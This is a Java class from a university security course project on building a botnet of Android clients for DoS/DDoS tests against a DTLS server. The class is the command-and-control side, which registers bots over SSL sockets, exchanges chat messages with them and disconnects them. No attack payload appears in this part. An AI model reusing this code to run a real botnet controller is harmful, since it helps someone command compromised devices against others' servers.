/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 * 
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 * 
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 * 
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 * 
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης 
 * 
 */

import botnet.botmasterandroidclient.Bot_Properties;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManagerFactory;
import javax.swing.JTextArea;


/**
 *
 * Class pou edrewnw tin epikoinwnia tou C&C me ta Bots (run & stop)
 * kathos k dimiourgia tou chat anametaksi tous.
 */

public class ChatWithBots extends Thread implements Serializable{
    private int port; //Port pou sindeete o C&C me ta Bots.
    private SSLSocket socket;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private Messages msgs = new Messages();
    private Chat chating = new Chat();
    private Bot_Properties CurBot = new Bot_Properties();
    private JTextArea Text;
    private boolean NewClient = false;
    private KeyManagerFactory serverKeyManager;
    private TrustManagerFactory trustManager;

    //An thelei o admin tu C&C borei na allaksei to port me ta Bots.
    public ChatWithBots(SSLSocket socket, int port, JTextArea Text) {
        this.socket = socket;
        this.port = port;
        this.Text = Text;
    }
    
    //Default Times gia to port me ta Bots:
    public ChatWithBots(SSLSocket socket, JTextArea Text) {
        this.socket = socket;
        this.Text = Text;
    }

    
    /**
     * synchronized void run gia na trehei kathe fora pou bainei kapoio
     * neo bot sto server alla k se periptwsi pou bun polla mazi na synhronizei
     * ta nimata tus.
     */
    @Override
    public synchronized void run(){
        try {
            oos = new ObjectOutputStream(socket.getOutputStream());
            ois = new ObjectInputStream(socket.getInputStream());
            Chat_Thread.start();   
            chating = new Chat(oos, ois, "Bot");
            chating.SendMessage(msgs.BotSendMeYourInfos());
            
        } catch (NullPointerException | IOException ex) {
            Stop_Connection();
        }     
    }
    

    /**
     * Methodos pou tin xrisimopoiume gia na kleisume to connection me kapoio 
     * botaki. Gia na kleisume kapoio bot kanume anazitisi stin lista me parametro
     * to socket to socket stin sigkekrimeni periptwsi to xrisimopoiw kai ws ID.
     * Molis vrw to katallilo socket kleinw olo to connection me to sigkekrimeno bot.
     */
    public void Stop_Connection(){
        /**
         * ta catch ta afinw kena gt dn thelw na bainei ekei
         * otan kapoio Bot vgainei apotoma, etsi k alliws tha dw
         * pws vgike otan tha stilw etima gia na  checkarw an einai edw
         * i an vgei me normal logout tha me enimerwsi.
         */
        keepWalking = false;
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {
            
        }
        try {
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            
        }
 
    }
    
    /**
     * Checkarume an to socket einai kleisto an einai kleisto epistefi true
     * ara to bot auto ehei aposindethei apo to server mas i ehei pesei.
     * An girisei false tote to bot sinehizei na einai syndedemeno k perimenei
     * entoles.
     */
    public boolean SocketIsClosed(){
        return socket.isClosed();
    }
    
    /**
     * Chat metaksi tou C&C k tou Bot.
     */
    private Thread Chat_Thread = new Thread(() -> {
        while(keepWalking == true){
            Object readObj = chating.readMessage();
            if(!(readObj.equals(""))){
                Text.append(msgs.SendAsBot()+ readObj.toString() + "\n");
            }
            //Stop to connection me ton C&C
            if (readObj.toString().equalsIgnoreCase(msgs.StopConnection())){
                chating.SendMessage(msgs.ByeBot());
                Text.append(msgs.SendAsServer() + msgs.ByeBot() +"\n");
                chating.SendMessage(msgs.StopConnection());
                Text.append(msgs.SendAsServer() + msgs.StopConnection() +"\n");
                Stop_Connection();
            }
            else if (readObj instanceof Bot_Properties){
                Bot_Properties bp = new Bot_Properties();
                bp = (Bot_Properties) readObj;
                bp.setSSLSocket(socket);
                bp.setOos(oos);
                CurBot = bp;
                NewClient = true;
                chating.SendMessage(msgs.WelcomeBot());
                Text.append(msgs.SendAsServer() + msgs.WelcomeBot() +"\n");
            }
        }
    });  

    public boolean NewClientAdded(){
        return NewClient;
    }
    //GETS:
    public boolean isKeepWalking() {
        return keepWalking;
    }

    public Bot_Properties getCurBot() {
        return CurBot;
    }    

    public void setSSLSocket(SSLSocket socket) {
        this.socket = socket;
    }
    
    
}//End class
